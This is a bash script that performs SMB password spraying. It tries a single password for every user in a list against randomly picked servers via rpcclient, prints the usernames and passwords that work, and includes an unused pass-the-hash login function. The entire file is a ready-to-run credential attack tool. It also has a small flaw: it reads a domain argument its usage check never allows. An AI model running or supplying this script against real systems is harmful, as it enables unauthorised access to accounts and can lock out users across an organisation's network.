#!/bin/bash

### FUNCTIONS:
# Normal login with cleartext pw:
smb_login () {
  rpcclient -U "$1%$2" $3 -c "getusername;quit" -W $4
}

# Login with pw hash:
smb_login_hash () {
  rpcclient -U "$1%$2" $3 -c "getusername;quit" -W $4 --pw-nt-hash
}

USERLIST=$1
SERVERS=$2
PASSWORD=$3
DOMAIN=$4

if [[ $# -ne 3 ]]; then
  echo "[USAGE] $0 <USER_LIST> <SMB_SERVERS> <PASSWORD>"
  exit 1
else
  echo "[*] Spraying users in $USERLIST with the password \"$PASSWORD\" against the servers in $SERVERS..."
fi

for U in $(cat $USERLIST); do
  SERVER=$(shuf -n 1 $SERVERS)
  CHECK=$(smb_login $U $PASSWORD $SERVER $DOMAIN)
  if [[ $(echo $CHECK | grep Account) ]]; then
    echo "[+] SUCCESS: $SERVER -> $U:$PASSWORD"
  elif [[ $(echo $CHECK | grep TIMEOUT) ]]; then
    # IF YOU WANT TO DEBUG TIMEOUTS, UNCOMMENT THIS:
    #echo "[+] TIMEOUT: $SERVER -> Trying next server..."
    SERVER=$(shuf -n 1 $SERVERS)
    CHECK=$(smb_login $U $PASSWORD $SERVER $DOMAIN)
    if [[ $(echo $CHECK | grep Account) ]]; then
      echo "[+] SUCCESS: $SERVER -> $U:$PASSWORD"
    fi
  fi
done
